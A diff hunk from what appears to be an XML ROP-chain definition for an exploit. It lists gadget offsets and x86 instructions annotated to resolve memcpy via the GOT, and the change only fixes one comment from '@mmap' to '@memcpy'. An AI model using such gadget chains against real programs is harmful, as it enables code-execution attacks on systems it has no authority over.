@@ -116,7 +116,7 @@
                 <gadget offset="0x0000c39c">add ebx, esi ; ret || ebx = esp + XX == src in memcpy</gadget>
                 <gadget offset="0x0006933f">pop eax; ret</gadget>
                 <gadget offset="0x00083024">memcpy@got - 4</gadget>
-                <gadget offset="0x0001a0d4">mov eax, dword [eax+0x04] ; ret || eax = @mmap</gadget>
+                <gadget offset="0x0001a0d4">mov eax, dword [eax+0x04] ; ret || eax = @memcpy</gadget>
                 <gadget offset="0x0001ffef">xchg eax, ebx ; ret  || eax = src in memcpy , ebx = @memcpy</gadget>
                 <gadget offset="0x00004803">pop esi ; ret</gadget>
                 <gadget offset="0x00082ff4">esi = offset of .got.plt section</gadget>
